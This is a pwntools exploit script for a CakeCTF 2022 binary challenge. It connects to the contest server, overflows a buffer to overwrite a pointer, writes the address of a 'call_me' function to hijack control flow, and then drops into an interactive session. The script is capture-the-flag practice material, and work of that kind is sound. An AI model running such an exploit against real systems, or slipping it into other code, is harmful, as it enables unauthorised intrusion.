from pwn import *

sendlineafter = lambda p, x, y: p.sendlineafter(x, y)

# p = process('./chall')
p = remote('pwn1.2022.cakectf.com', 9003)

call_me = 0x4016de

payload = b'A' * 0x20
payload += p64(0x404080)
sendlineafter(p, b': ', b'1')
sendlineafter(p, b': ', payload)
sendlineafter(p, b': ', b'3')
sendlineafter(p, b': ', p64(call_me))
p.interactive()
